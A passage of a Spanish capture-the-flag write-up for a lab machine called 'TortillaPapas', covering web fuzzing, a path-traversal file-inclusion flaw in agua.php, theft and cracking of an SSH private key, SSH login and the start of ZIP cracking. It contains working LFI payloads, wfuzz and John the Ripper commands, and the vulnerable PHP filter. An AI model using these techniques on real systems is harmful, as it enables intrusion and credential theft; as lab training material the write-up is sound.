+</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 279<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 26594<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.1.190/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.1.190/js/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/javascript           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 321<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.1.190/javascript/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 279<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 279<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/smokeping            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 320<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.1.190/smokeping/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 279<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/agua.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 26594<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">5926270</span> / <span style="color:#ae81ff">5926275</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para indicar las extensiones de archivos especificas a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Encontramos dos cosillas:</p>
+<ul>
+<li>Un directorio llamado <code>/smokeping</code>.</li>
+<li>Un archivo llamado <code>agua.php</code>.</li>
+</ul>
+<p>Empezaremos por revisar el directorio <code>/smokeping</code>.</p>
+<h3 id="Smokeping">Analizando Directorio smokeping</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura3.png">
+</p>
+<p>Parece ser un servicio que revisa la latencia de la red interna y la gráfica.</p>
+<p>Investiguemos el servicio:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Smokeping</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Smokeping es una herramienta de código abierto diseñada para la monitorización de la latencia, la pérdida de paquetes y la calidad de la conexión en redes. Fue desarrollada por Tobi Oetiker, el creador de RRDtool y MRTG, herramientas ampliamente utilizadas en el monitoreo de infraestructuras.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahí mismo, podemos ver la versión que están ocupando:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura4.png">
+</p>
+<p>Buscando un Exploit para esta versión, encontramos que es vulnerable a una <strong>condición de carrera</strong>:</p>
+<ul>
+<li><a href="https://bugs.gentoo.org/602652" target="_blank">CVE-2016-20015</a></li>
+</ul>
+<p>Pero para aplicar esto, necesitamos estar dentro de la máquina víctima, por lo que vamos a descartar este servicio de momento.</p>
+<h3 id="Agua">Analizando Peticiones y Respuestas de Archivo agua.php</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura5.png">
+</p>
+<p>Parece una copia de la página principal, es algo extraño y revisando el código fuente, no logre identificar algo.</p>
+<p>Entonces, podemos probar si existe un parámetro que se esté utilizando dentro del archivo.</p>
+<p>Algo que podemos hacer es provocar un error dentro de esta página con <strong>BurpSuite</strong>, con tal de identificar algún cambio y eso lo podemos utilizar como un delimitador en el <strong>Fuzzing</strong>.</p>
+<p>Captura la página y mandala al <strong>Repeater</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura6.png">
+</p>
+<p>Observa que en la respuesta, podemos ver una gran cantidad de bytes en la cabecera <strong>content-length</strong>, siendo <strong>26594</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura7.png">
+</p>
+<p>Podemos decir que eso es un resultado positivo.</p>
+<p>Lo curioso, es que al tratar de provocar un error, ya sea, poniendo un parámetro random o agregando caracteres extraños a la petición, nos regresa la misma cantidad de bytes:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura8.png">
+</p>
+<p>Esto nos da a entender, que es posible que se esté aplicando una sanitización o un filtro en las peticiones de este archivo, por lo que sería bueno utilizar ofuscación en nuestras peticiones.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="fuzzLFI">Aplicando Fuzzing para Encontrar Parámetro Correcto Utilizando Payload de LFI</h3>
+<p>Podemos intentar con los ejemplos de <strong>LFI</strong> que nos muestra <strong>HackTricks</strong>:</p>
+<ul>
+<li><a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses" target="_blank">HackTricks: File Inclusion / Path Traversal - Basic LFI and bypasses</a></li>
+</ul>
+<p>Probemos estos payloads con la herramienta <strong>wfuzz</strong>.</p>
+<p>Probando varios de estos, solamente uno es el que funciona, siendo <code>....//....//....//etc/passwd</code>.</p>
+<p>Observa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> --hh<span style="color:#f92672">=</span><span style="color:#ae81ff">26574</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://192.168.1.190/agua.php?FUZZ<span style="color:#f92672">=</span>....//....//....//etc/passwd
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://192.168.1.190/agua.php?FUZZ<span style="color:#f92672">=</span>....//....//....//etc/passwd
+</span></span><span style="display:flex;"><span>Total requests: 87664
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000758:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;file&#34;</span>                                                                                                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 253.3973
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">87664</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">87663</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 345.9546
+</span></span></code></pre></div><p>Probándolo en la página y <strong>BurpSuite</strong>, podemos ver que si funciona:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura9.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura10.png">
+</p>
+<p>Y ahora que ya encontramos el parámetro correcto, podemos utilizar un wordlists de <strong>Seclist</strong> que tiene varios payloads para aplicar <strong>LFI</strong>, siendo el wordlists <code>/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</code>.</p>
+<p>Probémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> --hh<span style="color:#f92672">=</span><span style="color:#ae81ff">26574</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u <span style="color:#e6db74">&#34;http://192.168.1.190/agua.php?file=FUZZ&#34;</span>
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://192.168.1.190/agua.php?file<span style="color:#f92672">=</span>FUZZ
+</span></span><span style="display:flex;"><span>Total requests: 929
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000338:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&#34;</span>     
+</span></span><span style="display:flex;"><span>000000335:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                        //etc/passwd&#34;</span>                                                                                                                
+</span></span><span style="display:flex;"><span>000000341:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&#34;</span>                       
+</span></span><span style="display:flex;"><span>000000353:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;....//....//....//etc/passwd&#34;</span>                                                                                               
+</span></span><span style="display:flex;"><span>000000347:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;....//....//....//....//....//....//....//....//....//etc/passwd&#34;</span>                                                           
+</span></span><span style="display:flex;"><span>000000350:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;....//....//....//....//....//....//etc/passwd&#34;</span>                                                                             
+</span></span><span style="display:flex;"><span>000000344:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">507</span> L    <span style="color:#ae81ff">1588</span> W     <span style="color:#ae81ff">27943</span> Ch    <span style="color:#e6db74">&#34;....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&#34;</span>                                         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 13.18469
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">929</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">922</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 70.46049
+</span></span></code></pre></div><p>Ahí están todos esos payloads que funcionaran contra la página para aplicar <strong>LFI</strong>.</p>
+<h3 id="SSHkey">Robando Llave Privada id_rsa a través de LFI, Crackeandola con JohnTheRipper y Conectandonos Vía SSH</h3>
+<p>Analizando el archivo <code>/etc/passwd</code>, podemos ver que hay 2 usuarios:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura11.png">
+</p>
+<p>Uno se llama <strong>concebolla</strong> y el otro <strong>sincebolla</strong>.</p>
+<p>Ya que podemos ver archivos de la máquina víctima, una de las cosas que podemos hacer es, tratar de robar las llaves privadas del <strong>servicio SSH</strong> de cualquiera de los dos.</p>
+<p>El problema es que al revisar cualquiera de los directorios de ambos usuarios, no encontraremos nada o al menos no obtendremos nada. Quizás, no podemos verlas porque no tenemos los permisos suficientes.</p>
+<p>Navegando un poco entre los directorios, encontramos una llave dentro del directorio <code>/opt</code>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura12.png">
+</p>
+<p>Muy extraño lugar para dejar una llave privada.</p>
+<p>Cópiala dentro de un archivo en tu máquina, pues vamos a crackearla para obtener su frase y poder usarla contra el <strong>servicio SSH</strong>.</p>
+<p>Una vez que la tengas copiada, vamos a obtener el hash de la llave con la herramienta <strong>ssh2john</strong> y la guardaremos en un archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh2john id_rsa &gt; hash
+</span></span></code></pre></div><p>Y con <strong>JohnTheRipper</strong>, crackeamos el hash obtenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>KDF/cipher <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>MD5/AES 1<span style="color:#f92672">=</span>MD5/3DES 2<span style="color:#f92672">=</span>Bcrypt/AES<span style="color:#f92672">])</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">16</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">5</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>XXXXX           <span style="color:#f92672">(</span>id_rsa<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:01:34 DONE <span style="color:#f92672">(</span>2025-03-22 23:25<span style="color:#f92672">)</span> 0.01062g/s 37.81p/s 37.81c/s 37.81C/s cougar..emelec
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Excelente, tenemos la frase de la llave.</p>
+<p>Ahora podemos usarla para conectarnos al <strong>servicio SSH</strong>, siendo que al probarla con ambos usuarios, resulto ser la llave privada del <strong>usuario sincebolla</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa sincebolla@192.168.1.190
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>: 
+</span></span><span style="display:flex;"><span>Linux tortillapapas 6.1.0-18-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Thu Apr <span style="color:#ae81ff">18</span> 12:40:58 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>sincebolla@tortillapapas:~$ whoami
+</span></span><span style="display:flex;"><span>sincebolla
+</span></span></code></pre></div><p>Funciono correctamente.</p>
+<p>Aquí podemos encontrar la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>sincebolla@tortillapapas:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Antes de continuar, quiero comprobar la sanitización que se estaba realizando para aplicar el <strong>LFI</strong> y eso lo podemos encontrar en el directorio <code>/var/www/tortilla</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ ls -la /var/www/tortilla/
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">84</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> www-data www-data  <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root     root      <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">27010</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> agua.php
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data  <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2023</span> css
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">56</span> abr <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2024</span> hola.php
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data  <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> images
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">26594</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> index.html
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data  <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2023</span> js
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data  <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> tortilla
+</span></span></code></pre></div><p>Ahí está el archivo <strong>agua.php</strong> y existe otro llamado <strong>hola.php</strong>, que al parecer es una <strong>Reverse Shell</strong>.</p>
+<p>Analizando el archivo <strong>agua.php</strong>, al final, encontramos algo interesante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ cat /var/www/tortilla/agua.php 
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>   &lt;head&gt;
+</span></span><span style="display:flex;"><span>      &lt;!-- basic --&gt;
+</span></span><span style="display:flex;"><span>      &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;file&#39;</span><span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    // Verificar si la URL contiene la secuencia específica
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>strpos<span style="color:#f92672">(</span>$filename, <span style="color:#e6db74">&#34;....//....//....&#34;</span><span style="color:#f92672">)</span> !<span style="color:#f92672">==</span> false<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        // Eliminar <span style="color:#e6db74">&#39;../&#39;</span> repetidos para evitar exceso de retroceso
+</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;....//....//....&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $filename<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        // Ahora incluir el archivo
+</span></span><span style="display:flex;"><span>        include<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/&#34;</span> . $filename<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><p>Ahí está la sanitización.</p>
+<p>Ahora sí, continuemos.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="enumLin">Enumeración de la Máquina Linux y Crackeando Archivo ZIP</h3>
+<p>Podemos encontrar la llave privada del <strong>usuario sincebolla</strong> y podemos ver que únicamente este usuario puede verla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ ls -la .ssh/
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> sincebolla sincebolla <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">4</span> sincebolla sincebolla <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> sincebolla sincebolla  <span style="color:#ae81ff">578</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> authorized_keys
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> sincebolla sincebolla <span style="color:#ae81ff">2655</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> id_rsa
+</span></span></code></pre></div><p>Por lo que no podríamos haber visto la llave aplicando <strong>LFI</strong> o al menos esa es mi conclusión.</p>
+<p>Revisando el directorio <code>/opt</code> donde encontramos la llave, encontramos algunas cosillas:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ ls /opt
+</span></span><span style="display:flex;"><span>cositas.zip  id_rsa  sa_matao_Paco.txt
+</span></span></code></pre></div><p>Vemos un <strong>archivo ZIP</strong>, la llave privada y un archivo de texto.</p>
+<p>Veamos lo que dice ese mensaje:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ cat /opt/sa_matao_Paco.txt 
+</span></span><span style="display:flex;"><span>Esta id_rsa es de sincebolla, tan torpe es que la deja aqui, por eso le gusta sin cebolla
+</span></span></code></pre></div><p>Con razón encontramos aquí la llave.</p>
+<p>Descarguemos el <strong>archivo ZIP</strong> con la herramienta <strong>scp</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp -i id_rsa sincebolla@192.168.1.190:/opt/cositas.zip .
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>: 
+</span></span><span style="display:flex;"><span>cositas.zip
+</span></span></code></pre></div><p>Tratemos de descomprimirlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip cositas.zip
+</span></span><span style="display:flex;"><span>Archive:  cositas.zip
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>cositas.zip<span style="color:#f92672">]</span> id_rsa password:
+</span></span></code></pre></div><p>No podemos, pues nos pide una contraseña, así que hay que crackearlo para obtenerla.</p>
+<p>Obtengamos el hash de este archivo con la herramienta <strong>zip2john</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john cositas.zip &gt; hashZIP
+</span></span><span style="display:flex;"><span>ver 2.0 efh <span style="color:#ae81ff">5455</span> efh <span style="color:#ae81ff">7875</span> cositas.zip/id_rsa PKZIP Encr: TS_chk, cmplen<span style="color:#f92672">=</span>2033, decmplen<span style="color:#f92672">=</span>2655, crc<span style="color:#f92672">=</span>7638044A ts<span style="color:#f92672">=</span><span style="color:#ae81ff">6370</span> cs<span style="color:#f92672">=</span><span style="color:#ae81ff">6370</span> type<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
